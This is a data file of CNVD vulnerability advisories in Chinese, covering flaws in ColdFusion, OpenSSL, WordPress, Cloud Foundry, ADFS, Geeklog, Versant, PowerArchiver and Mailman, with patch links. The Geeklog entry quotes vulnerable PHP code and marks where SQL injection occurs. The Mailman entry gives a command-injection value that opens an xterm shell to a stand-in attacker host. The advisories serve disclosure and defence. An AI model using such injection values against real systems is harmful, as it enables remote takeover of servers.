CNVD-2015-02633,74063,Adobe ColdFusion存在未明跨站脚本漏洞（CNVD-2015-02633）,2015/4/22,中,Adobe ColdFusion 10（<Update 16），11（<Update 5）   ;   Adobe ColdFusion 11（<Update 5）   ;   ,"Adobe ColdFusion是一个动态Web服务器,其CFML是一种程序设计语言,类似现在的JSP里的JSTL。Adobe ColdFusion存在未明跨站脚本漏洞，允许远程攻击者利用漏洞注入恶意脚本或HTML代码，当恶意数据被查看时，可获取敏感信息或劫持用户会话。",https://helpx.adobe.com/security/products/coldfusion/apsb15-07.html,用户可参考如下厂商提供的安全公告获取补丁以修复该漏洞：https://helpx.adobe.com/security/products/coldfusion/apsb15-07.html,Adobe ColdFusion存在未明跨站脚本漏洞（CNVD-2015-02633）的补丁:http://www.cnvd.org.cn/patchInfo/show/57477
CNVD-2015-03810,75156,OpenSSL X509_cmp_time函数拒绝服务漏洞,2015/6/17,中,OpenSSL  OpenSSL <0.9.8zg   ;   OpenSSL  OpenSSL 1.0.0(<1.0.0s)   ;   OpenSSL  OpenSSL 1.0.1(<1.0.1n)   ;   OpenSSL  OpenSSL 1.0.2(<1.0.2b)   ;   ,OpenSSL是一种开放源码的SSL实现，用来实现网络通信的高强度加密，现在被广泛地用于各种网络应用程序中。OpenSSL的crypto/x509/x509_vfy.c文件中的‘X509_cmp_time’函数存在安全漏洞。允许远程攻击者利用该漏洞通过ASN1_TIME数据中特制的长度字段造成拒绝服务（越边界读取和应用程序崩溃）。,https://www.openssl.org/news/secadv_20150611.txt,目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：https://www.openssl.org/news/secadv_20150611.txt,OpenSSL X509_cmp_time函数拒绝服务漏洞的补丁 :http://www.cnvd.org.cn/patchInfo/show/59719
CNVD-2015-05226,76064,WordPress Flickr Justified Gallery插件'fjgwpp.php'跨站脚本漏洞,2015/8/13,中,WordPress Flickr Justified Gallery   ;   ,WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台，该平台支持在PHP和MySQL的服务器上架设个人博客网站。Flickr Justified Gallery是其中的一个JQuery图片库插件。WordPress Flickr Justified Gallery插件'fjgwpp.php'存在跨站脚本漏洞，由于程序未能充分过滤用户提交的输入。允许攻击者利用此漏洞窃取基于cookie的身份验证，在受影响的浏览器上下位置执行任意脚本代码。,http://www.securityfocus.com/bid/76064,用户可参考如下供应商提供的安全公告获得补丁信息：https://wordpress.org/plugins/flickr-justified-gallery/changelog/,WordPress Flickr Justified Gallery插件'fjgwpp.php'跨站脚本漏洞的补丁:http://www.cnvd.org.cn/patchInfo/show/62359
CNVD-2017-16376,99251,多款Pivotal产品会话固定漏洞,2017/7/25,中,Pivotal Software Cloud Foundry 252   ;   Pivotal Software Cloud Foundry UAA 3.11   ;   Pivotal Software Cloud Foundry UAA  3.0   ;   Pivotal Software Cloud Foundry UAA  2.0   ;   Pivotal Software Cloud Foundry UAA  2.7.4.12   ;   Pivotal Software Cloud Foundry UAA BOSH 26   ;   ,Cloud Foundry是开源的云计算机平台。UAA是用户认证模块，是一个Java Spring项目。多款Pivotal产品存在会话固定漏洞。攻击者可以劫持任意会话，并获得未经授权的访问受影响的应用程序。,http://www.securityfocus.com/bid/99251,用户可参考如下供应商提供的安全公告获得补丁信息：https://www.cloudfoundry.org/cve-2017-4963/,多款Pivotal产品会话固定漏洞的补丁:http://www.cnvd.org.cn/patchInfo/show/98783
CNVD-2018-13183,104656,Microsoft Active Directory Federation Services跨站脚本漏洞,2018/7/16,中,Microsoft Active Directory Federation Services（ADFS）   ;   ,Microsoft Active Directory Federation Services（ADFS）是美国微软（Microsoft）公司推出的一项活动目录联合服务。该服务提供Web单一登入（SSO）技术，可实现在一次会话过程中对多个网站（或应用程序）验证某个使用者。Microsoft AD FS中存在跨站脚本漏洞，该漏洞源于开源自定义未能正确的过滤发送到受影响AD FS服务器的特制Web请求。远程攻击者可通过发送特制的请求利用该漏洞在当前用户的安全上下文中执行脚本。,https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8326,目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8326,Microsoft Active Directory Federation Services跨站脚本漏洞的补丁:http://www.cnvd.org.cn/patchInfo/show/134167
CNVD-2009-2142, ,Geeklog SEC_authenticate()函数SQL注入漏洞,2009/4/9,高,(暂无),"Geeklog是一个免费的、开放源码的Web应用程序。它可以使用户创建一个虚拟的社区，可以管理用户，张贴文章等。Geeklog采用PHP实现，以MySQL为后台数据库。Geeklog的index.php模块中的SEC_authenticate()函数没有正确的验证用户所提交的PHP_AUTH_USER和REMOTE_USER变量参数，远程攻击者可以通过提交恶意查询请求执行SQL注入攻击。以下是/public_html/webservices/atom/index.php文件中34-53行的有漏洞代码段：...require_once '../../lib-common.php';if (PHP_VERSION &lt; 5) {$_CONF['disable_webservices'] = true;} else {require_once $_CONF['path_system'] . '/lib-webservices.php';}if ($_CONF['disable_webservices']) {COM_displayMessageAndAbort($LANG_404[3], '', 404, 'Not Found');}header('Content-type: ' . 'application/atom+xml' . '; charset=UTF-8');WS_authenticate();.../system/lib-webservices.php文件780-877行的WS_authenticate()函数：...function WS_authenticate(){global $_CONF, $_TABLES, $_USER, $_GROUPS, $_RIGHTS, $WS_VERBOSE;$uid = '';$username = '';$password = '';$status = -1;if (isset($_SERVER['PHP_AUTH_USER'])) {$username = $_SERVER['PHP_AUTH_USER'];$password = $_SERVER['PHP_AUTH_PW'];if ($WS_VERBOSE) {COM_errorLog(""WS: Attempting to log in user '$username'"");}} elseif (!empty($_SERVER['REMOTE_USER'])) {list($auth_type, $auth_data) = explode(' ', $_SERVER['REMOTE_USER']);list($username, $password) = explode(':', base64_decode($auth_data));if ($WS_VERBOSE) {COM_errorLog(""WS: Attempting to log in user '$username' (via \$_SERVER['REMOTE_USER'])""); }} else {if ($WS_VERBOSE) {COM_errorLog(""WS: No login given"");}}...之后在907-909行：...if (($status == -1) && $_CONF['user_login_method']['standard']) {$status = SEC_authenticate($username, $password, $uid);}.../system/lib-security.php文件的695-717行：...function SEC_authenticate($username, $password, &$uid){global $_CONF, $_TABLES, $LANG01;$result = DB_query(""SELECT status, passwd, email, uid FROM {$_TABLES['users']} WHERE username='$username' AND ((remoteservice is null) or (remoteservice = ''))""); //&lt;------------------- SQL INJECTION HERE$tmp = DB_error();$nrows = DB_numRows($result);if (($tmp == 0) && ($nrows == 1)) {$U = DB_fetchArray($result);$uid = $U['uid'];if ($U['status'] == USER_ACCOUNT_DISABLED) {// banned, jump to here to save an md5 calc.return USER_ACCOUNT_DISABLED;} elseif ($U['passwd'] != SEC_encryptPassword($password)) {return -1; // failed login} elseif ($U['status'] == USER_ACCOUNT_AWAITING_APPROVAL) {return USER_ACCOUNT_AWAITING_APPROVAL;} elseif ($U['status'] == USER_ACCOUNT_AWAITING_ACTIVATION) {// Awaiting user activation, activate:DB_change($_TABLES['users'], 'status', USER_ACCOUNT_ACTIVE,'username', $username);return USER_ACCOUNT_ACTIVE;} else {return $U['status']; // just return their status}} else {$tmp = $LANG01[32] . "": '"" . $username . ""'"";COM_errorLog($tmp, 1);return -1;}}...可在这个函数的username参数中注入SQL代码，该参数来自$_SERVER['PHP_AUTH_USER']或$_SERVER['REMOTE_USER']变量。",Null,Geeklog-------目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://geeklog.sourceforge.net/,Null
CNVD-2008-1161, ,Versant对象数据库VERSANT_ROOT远程任意命令执行漏洞,2008/3/4,高,(暂无),Versant对象数据库用于在企业范围内提供可导航访问、无缝数据发布等服务。VersantD在处理用户请求数据时存在漏洞，远程攻击者可能利用此漏洞控制服务器。VersantD是用于管理Versant数据库的服务，默认监听于5019端口，在客户端连接后会分配一个新的端口，因此客户端首先要连接到5019端口（由ss.exe进程处理），在初始数据交换后连接会在新的端口上继续。在客户端连接时服务器启动程序或锁定数据库文件所必须的完整路径是直接由客户端所传送的，因此如果客户端在VERSANT_ROOT字段中传送了c:\folder的话，服务器就会在使用-utility命令的情况下通过vs_prgExecAsync函数运行c:\folder\bin\obe.exe -version 7.0.1 -dbtype + -nettype 2 -arch 11 -utility -soc 220 o_oscp命令，然后在-utility使用以..\形式开始的自定义命令值，就可以删除服务器所添加的\bin\文件夹，这样不但可以执行自定义可执行程序，还可以执行额外的参数。此外还可以通过Windows共享使用\\myhost\myfolder作为路径执行服务器上没有的远程命令，因此攻击者可以在Versant服务器上执行任意本地或远程自定义命令。,Null,Versant-------目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://www.versant.com/en_US/products/objectdatabase,Null
CNVD-2007-0041, ,PowerArchiver PAISO.DLL ISO文件处理栈溢出漏洞,2007/1/4,高,(暂无),PowerArchiver是一款压缩程序，除了一般压缩与解压缩的功能外，它并可设立密码及分片压缩功能，且支持鼠标右键的快显功能。PowerArchiver在创建ISO镜像中文件的完整路径名时存在栈溢出漏洞，攻击者可能利用此漏洞控制用户机器。PowerArchiver所捆绑的PAISO.DLL中的LoadTree()和ReadHeader()函数会通过读取ISO文件中的目录项创建ISO镜像中每个文件的完整路径。从每个目录项所读取的目录名是通过lstrcatA()连接到一起的，最后再连接到文件名，之后使用了不安全的lstrcpyA()函数将所创建的文件名拷贝到了固定长度的栈缓冲区。每个目录名的长度都受ISO格式的限制，但攻击者可以在ISO镜像中包含嵌套于多级目录中的文件，导致创建可以溢出栈缓冲区的完整路径名，覆盖保存的EIP和SEH处理器。,Null,ConeXware---------目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：http://www.powerarchiver.com/download/,Null
CNVD-2001-3008, ,Mailman Email Archive 跨站脚本执行漏洞,2001/11/28,低,(暂无),Mailman Email Archiver是一款流行的Email管理CGI脚本。该脚本存在跨站脚本执行漏洞，这可能被恶意攻击者利用获取用户敏感信息。&lt;*来源：zeno （&lt;a href='mailto:zeno@cgisecurity.net'>zeno@cgisecurity.net&lt;/a>）  链接：&lt;a href='http://archives.neohapsis.com/archives/bugtraq/2001-11/0236.html'>http://archives.neohapsis.com/archives/bugtraq/2001-11/0236.html&lt;/a> *>,Null,,Null
CNVD-2000-0936, ,Mailman 1.1 远程执行命令漏洞,2000/9/12,低,(暂无),Mailman的配置文件中使用的一些变量可以由邮件列表管理员指定。例如在$prefix/Mailman/mm_cfg.py配置文件中可能有下列配置语句： PUBLIC_EXTERNAL_ARCHIVER = '(mhonarc -add -nolock -umask 023 -rcfile rc.%(listname)s -outdir /mnt/WWW/htdocs/lists/%(listname)s)' 这里(listname)的值可以被邮件列表的管理员创建，如果，这个值被设置成一些系统命令，当消息被发送到这个列表时，系统就会执行这些命令，例如，如果listname的值设置成了： `/usr/X11R6/bin/xterm -display www.attacker.com:0 -e /bin/csh` 攻击者就可以在自己的机器上打开一个mailman主机的xterm窗口。,Null,,Null
